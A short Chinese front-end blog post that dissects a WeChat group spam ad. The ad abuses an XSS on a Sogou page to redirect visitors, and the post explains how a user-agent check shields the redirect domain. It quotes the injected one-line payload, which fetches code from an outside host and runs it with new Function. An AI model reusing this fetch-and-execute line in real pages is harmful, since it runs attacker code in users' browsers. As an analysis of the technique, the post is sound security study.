---
title: 一个意思的微信群广告
categories:
  - front-end
tags:
  - 安全
img: ../../coverImages/xss.png
date: 2022-10-06 18:00:00
---

群广告，语不惊人死不休，

![](/images/2022/10/06/16650521586506.jpg)


跳转之后，出现 sougou 的页面，然后重定向到广告页面。

![](/images/2022/10/06/16650521657367.jpg)


构造了一个 xss，script 标签，被执行。

```js
fetch('//iprozz.com/ffff').then(r=>r.text()).then(C=>new Function(C)())
```

`iprozz.com/ffff` 请求发出去之后，被执行，页面跳转到广告页面。`new Function(C)()` 这种函数执行方式平时用的还是非常少的，安全方面，各种奇奇怪怪的写法，挺有意思。

如果只是到这里，也没必要写这篇博客。尝试调试的时候，发现，在一般浏览器里面是无法请求这个地址的，似乎只在微信的浏览器的可以请求，应该是识别了微信的ua。这样二级跳转，可以对域名做一层保护，减少被封。当域名被封之后，也可以修改服务端的跳转地址，实现快速更换域名的目的。

做戏做全套，我们平时的开发中经常抱有侥幸心理，对比一下人家的态度，我们真的能比骗子更专业吗？